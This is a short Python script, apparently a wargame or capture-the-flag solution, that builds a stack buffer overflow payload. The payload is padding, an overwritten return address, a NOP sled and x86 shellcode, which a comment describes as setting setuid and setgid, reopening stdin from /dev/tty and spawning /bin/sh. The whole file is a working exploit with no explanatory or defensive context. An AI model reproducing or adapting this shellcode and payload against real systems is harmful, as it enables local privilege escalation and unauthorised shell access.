#!/usr/bin/env python

from __future__ import print_function
import struct

pad = b"\x90" * 140

eip = struct.pack("I", 0xbffff6c0 + 200)

nop = b"\x90" * 1000

# setuid, setgid, reopens stdin, and run /bin/sh
shellcode = b"\x83\xc4\x18\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

to_print = pad + eip + nop + shellcode

print(to_print, end = '')
